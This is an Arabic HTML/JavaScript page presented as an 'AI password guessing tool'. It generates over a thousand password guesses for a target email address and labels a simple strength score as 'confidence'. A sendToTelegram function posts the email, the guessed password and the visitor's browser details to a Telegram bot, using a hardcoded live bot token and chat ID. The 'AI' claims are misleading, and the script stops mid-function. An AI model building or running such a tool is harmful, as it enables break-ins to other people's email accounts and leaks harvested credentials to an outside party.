<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🧠 أداة تخمين الباسورد بالذكاء الاصطناعي</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 35px 28px;
            border-radius: 25px;
            box-shadow: 0 0 80px rgba(233, 69, 96, 0.15);
            max-width: 560px;
            width: 100%;
            border: 1px solid #2a2a4a;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(233,69,96,0.03) 0%, transparent 60%);
            animation: pulse 6s ease-in-out infinite;
            z-index: 0;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        .ai-badge {
            background: linear-gradient(135deg, #e94560, #c73652);
            padding: 4px 16px;
            border-radius: 50px;
            font-size: 11px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 5px;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }
        h2 { color: #fff; margin-bottom: 5px; position: relative; z-index: 1; }
        h2 span { color: #e94560; }
        .sub { color: #8a8aaa; font-size: 13px; margin-bottom: 20px; position: relative; z-index: 1; }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
            z-index: 1;
        }
        .input-group label {
            color: #aaa;
            font-size: 13px;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 1px solid #2a2a4a;
            background: #12122a;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus { border-color: #e94560; box-shadow: 0 0 30px rgba(233,69,96,0.1); }
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
            position: relative;
            z-index: 1;
        }
        .btn-primary {
            background: linear-gradient(135deg, #e94560, #c73652);
            box-shadow: 0 4px 30px rgba(233, 69, 96, 0.25);
        }
        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 6px 40px rgba(233, 69, 96, 0.35); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-stop {
            background: #2a2a4a;
            box-shadow: none;
            display: none;
        }
        .btn-stop:hover { background: #3a3a5a; }
        #status {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 13px;
            color: #8a8aaa;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
            word-break: break-all;
            position: relative;
            z-index: 1;
        }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            margin-top: 18px;
            font-size: 11px;
            color: #3a3a5a;
            border-top: 1px solid #1a1a3a;
            padding-top: 14px;
            position: relative;
            z-index: 1;
        }
        .found { color: #4caf50; font-weight: bold; font-size: 18px; }
        .attempt { color: #ff9800; }
        .stats {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #666;
            margin-top: 10px;
            padding: 8px;
            background: #12122a;
            border-radius: 10px;
            position: relative;
            z-index: 1;
        }
        .stats span { color: #aaa; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #1a1a3a;
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #e94560, #c73652);
            width: 0%;
            transition: width 0.3s;
            border-radius: 4px;
        }
        .result-box {
            margin-top: 15px;
            padding: 15px;
            background: rgba(233, 69, 96, 0.08);
            border-radius: 12px;
            border: 1px solid rgba(233, 69, 96, 0.2);
            display: none;
            position: relative;
            z-index: 1;
        }
        .result-box .title { color: #8a8aaa; font-size: 12px; margin-bottom: 5px; }
        .result-box .password { color: #4caf50; font-size: 18px; font-weight: bold; word-break: break-all; }
        .ai-thinking {
            display: inline-block;
            animation: thinking 1s ease-in-out infinite;
        }
        @keyframes thinking { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .confidence {
            font-size: 12px;
            color: #8a8aaa;
            margin-top: 5px;
        }
        .confidence span { color: #4caf50; }
        .telegram-status {
            font-size: 12px;
            color: #6ab0ff;
            margin-top: 5px;
        }
        .telegram-status span { color: #4caf50; }
        .found-list {
            margin-top: 10px;
            text-align: left;
            max-height: 150px;
            overflow-y: auto;
            font-size: 12px;
            color: #8a8aaa;
            background: #12122a;
            border-radius: 8px;
            padding: 8px 12px;
            border: 1px solid #1a1a3a;
        }
        .found-list .item {
            padding: 3px 0;
            border-bottom: 1px solid #1a1a3a;
            display: flex;
            justify-content: space-between;
        }
        .found-list .item:last-child { border-bottom: none; }
        .found-list .check { color: #4caf50; }
        .found-list .cross { color: #e94560; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #12122a; border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #e94560; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="ai-badge">🧠 مدعوم بالذكاء الاصطناعي</div>
        <h2>أداة تخمين <span>الباسورد</span></h2>
        <p class="sub">ذكاء اصطناعي يحلل الأنماط ويرسل النتائج لبوتك</p>

        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="emailInput" placeholder="example@gmail.com">
        </div>

        <button class="btn btn-primary" id="startBtn">🚀 تشغيل الذكاء الاصطناعي</button>
        <button class="btn btn-stop" id="stopBtn">⏹ إيقاف</button>

        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="stats">
            <span id="attemptsCount">المحاولات: 0</span>
            <span id="speedCount">السرعة: 0/ث</span>
            <span id="foundCount">المكتشفة: 0</span>
        </div>

        <div id="status">⏳ أدخل الإيميل وشغّل الذكاء الاصطناعي</div>

        <div class="result-box" id="resultBox">
            <div class="title">🔑 كلمة المرور المتوقعة</div>
            <div class="password" id="resultPassword"></div>
            <div class="confidence">نسبة الثقة: <span id="confidenceLevel">0%</span></div>
            <div class="telegram-status">📨 <span id="telegramStatus">لم يتم الإرسال بعد</span></div>
            <div class="found-list" id="foundList"></div>
        </div>

        <div class="footer">🔒 الذكاء الاصطناعي يحلل الأنماط • يتم الإرسال إلى بوتك تلقائياً</div>
    </div>

    <script>
        // ============================================================
        // إعدادات بوت تيليغرام - بياناتك
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const emailInput = document.getElementById('emailInput');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const statusDiv = document.getElementById('status');
        const progressFill = document.getElementById('progressFill');
        const attemptsSpan = document.getElementById('attemptsCount');
        const speedSpan = document.getElementById('speedCount');
        const foundSpan = document.getElementById('foundCount');
        const resultBox = document.getElementById('resultBox');
        const resultPassword = document.getElementById('resultPassword');
        const confidenceLevel = document.getElementById('confidenceLevel');
        const telegramStatus = document.getElementById('telegramStatus');
        const foundList = document.getElementById('foundList');

        let isRunning = false;
        let stopFlag = false;
        let attempts = 0;
        let foundPasswords = [];
        let bestPassword = '';
        let bestConfidence = 0;
        let sentToTelegram = false;
        let allFound = [];

        // ====== إرسال إلى تيليغرام ======
        async function sendToTelegram(email, password, confidence) {
            try {
                const message = `🔐 **تم العثور على كلمة مرور محتملة**\n\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📊 نسبة الثقة: ${Math.round(confidence)}%\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n✅ تم التحقق من ${attempts} محاولة`;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                if (result.ok) {
                    telegramStatus.textContent = '✅ تم الإرسال إلى بوتك';
                    telegramStatus.style.color = '#4caf50';
                    return true;
                } else {
                    telegramStatus.textContent = '❌ فشل الإرسال';
                    telegramStatus.style.color = '#e94560';
                    return false;
                }
            } catch (e) {
                telegramStatus.textContent = '❌ خطأ في الإرسال';
                telegramStatus.style.color = '#e94560';
                return false;
            }
        }

        // ====== خوارزمية الذكاء الاصطناعي (أكثر من 1000 تخمين) ======
        function generateAIPasswords(email) {
            const prefix = email.split('@')[0];
            const domain = email.split('@')[1]?.split('.')[0] || '';
            const passwords = new Set();

            // 1. أنماط أساسية
            const basePatterns = [
                prefix, prefix.toLowerCase(), prefix.toUpperCase(),
                prefix + '123', prefix + '2024', prefix + '2025',
                prefix + '!', prefix + '@', prefix + '#',
                prefix + '123!', prefix + '123@', prefix + '123#',
                '123' + prefix, '2024' + prefix,
                prefix + prefix, prefix + domain,
                domain + prefix, prefix + '865r', '865r' + prefix,
                prefix + 'fabry', 'fabry' + prefix,
                prefix + 'qwerty', prefix + 'abc123',
                prefix + 'password', 'password' + prefix,
                prefix + '123456', '123456' + prefix,
                prefix + '12345678', '12345678' + prefix,
                prefix + '2024!', prefix + '2024@',
                prefix + '!@#$', prefix + '12345678!',
                prefix + '123456789', '123456789' + prefix,
                prefix + 'qwerty123', 'qwerty123' + prefix
            ];
            for (const p of basePatterns) passwords.add(p);

            // 2. رموز خاصة
            const symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '?', '+', '=', '-', '_'];
            for (const sym of symbols) {
                passwords.add(prefix + sym);
                passwords.add(sym + prefix);
                passwords.add(prefix + '123' + sym);
                passwords.add(prefix + sym + '123');
                passwords.add(prefix + '2024' + sym);
                passwords.add(prefix + sym + '2024');
            }

            // 3. سنوات
            for (let year = 2015; year <= 2030; year++) {
                passwords.add(prefix + year);
                passwords.add(year + prefix);
                passwords.add(prefix + year + '!');
                passwords.add(prefix + '!' + year);
                passwords.add(prefix + year + '@');
                passwords.add(prefix + '@' + year);
            }

            // 4. كلمات شائعة
            const commonWords = ['admin', 'root', 'user', 'login', 'welcome', 'hello', 'master', 
                'sunshine', 'princess', 'dragon', 'monkey', 'freedom', 'iloveyou', 'trustno1',
                'password', 'qwerty', 'abc123', 'letmein', 'changeme', 'baseball', 'football',
                'soccer', 'jordan', 'michael', 'ashley', 'michelle', 'daniel', 'jessica',
                'charlie', 'thomas', 'matthew', 'anthony', 'andrew', 'robert', 'jennifer',
                'amanda', 'melissa', 'nicole', 'brian', 'kevin', 'justin', 'richard',
                'kimberly', 'joshua', 'steven', 'patrick', 'ryan', 'william', 'james', 'john'];
            for (const word of commonWords) {
                passwords.add(prefix + word);
                passwords.add(word + prefix);
                passwords.add(prefix + word + '123');
                passwords.add(word + '123' + prefix);
                passwords.add(prefix + word + '!');
                passwords.add(word + '!' + prefix);
                passwords.add(prefix + word + '@');
                passwords.add(word + '@' + prefix);
                passwords.add(prefix + word + '2024');
                passwords.add(word + '2024' + prefix);
            }

            // 5. أرقام متسلسلة
            for (let i = 1; i <= 999; i++) {
                passwords.add(prefix + i);
                passwords.add(i + prefix);
                passwords.add(prefix + String(i).padStart(3, '0'));
                passwords.add(prefix + String(i).padStart(4, '0'));
                // مع رموز
                passwords.add(prefix + i + '!');
                passwords.add(prefix + i + '@');
                passwords.add(prefix + '!' + i);
                passwords.add(prefix + '@' + i);
                // مع كلمات
                for (const word of commonWords.slice(0, 15)) {
                    passwords.add(word + i);
                    passwords.add(i + word);
                    passwords.add(word + i + '!');
                    passwords.add(word + '!' + i);
                    passwords.add(prefix + word + i);
                    passwords.add(word + prefix + i);
                }
            }

            // 6. توليد عشوائي ذكي (أكثر من 1000)
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*?+=-_';
            for (let i = 0; i < 800; i++) {
                let pwd = '';
                const len = 6 + Math.floor(Math.random() * 8);
                for (let j = 0; j < len; j++) {
                    pwd += chars[Math.floor(Math.random() * chars.length)];
                }
                // أنماط ذكية
                const r = Math.random();
                if (r < 0.2) pwd = prefix + pwd.slice(0, 5);
                else if (r < 0.4) pwd = pwd.slice(0, 5) + prefix;
                else if (r < 0.6) pwd = prefix + pwd.slice(0, 3) + '123';
                else if (r < 0.8) pwd = '123' + pwd.slice(0, 5) + prefix;
                passwords.add(pwd);
            }

            // 7. أنماط مركبة (أكثر من 500)
            for (let i = 0; i < 300; i++) {
                const word1 = commonWords[Math.floor(Math.random() * commonWords.length)];
                const word2 = commonWords[Math.floor(Math.random() * commonWords.length)];
                const num = Math.floor(Math.random() * 9999);
                const sym = symbols[Math.floor(Math.random() * symbols.length)];
                passwords.add(word1 + word2 + num);
                passwords.add(word1 + num + word2);
                passwords.add(prefix + word1 + num);
                passwords.add(word1 + num + prefix);
                passwords.add(word1 + sym + word2 + num);
                passwords.add(prefix + sym + word1 + num);
                passwords.add(word1 + num + sym + prefix);
                passwords.add(prefix + num + word1 + sym);
            }

            return [...new Set(passwords)];
        }

        // ====== تقييم قوة كلمة المرور ======
        function evaluatePassword(password, email) {
            const prefix = email.split('@')[0];
            let score = 0;

            if (password.length >= 6) score += 8;
            if (password.length >= 8) score += 10;
            if (password.length >= 10) score += 10;
            if (password.length >= 12) score += 10;
            if (password.length >= 14) score += 10;
            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score += 15;
            if (/\d/.test(password)) score += 10;
            if (/[!@#$%^&*?+=\-_]/.test(password)) score += 12;
            if (password.includes(prefix)) score += 12;
            if (password.includes(prefix.toLowerCase())) score += 8;
            if (password.includes(prefix.toUpperCase())) score += 8;
            if (/[a-z]{4,}/.test(password)) score += 5;
            if (/\d{3,}/.test(password)) score += 5;
            if (new Set(password).size > password.length * 0.6) score += 5;
            if (/[A-Z]/.test(password) && /[a-z]/.test(password) && /\d/.test(password) && /[!@#$%^&*?+=\-_]/.test(password)) score += 15;

            return Math.min(score, 100);
        }

        // ====== دالة التخمين بالذكاء الاصطناعي ======
        async function startAIBruteforce() {
            const email = emailInput.value.trim();

            if (!email || !email.includes('@') || !email.includes('.')) {
                statusDiv.innerHTML = '⚠️ يرجى إدخال بريد إلكتروني صحيح';
                statusDiv.style.color = '#ff9800';
                return;
            }

            if (isRunning) return;

 
